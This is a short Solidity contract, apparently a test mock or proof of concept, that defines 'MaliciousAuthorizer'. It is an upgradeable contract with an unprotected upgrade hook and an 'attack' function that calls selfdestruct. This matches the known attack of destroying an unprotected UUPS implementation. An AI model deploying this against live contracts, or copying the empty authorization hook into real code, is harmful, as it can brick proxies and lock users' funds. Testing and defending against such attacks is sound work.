// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract MaliciousAuthorizer is UUPSUpgradeable {
    function attack() external {
        selfdestruct(payable(msg.sender));
    }
    function _authorizeUpgrade(address newImplementation) internal override {}
}
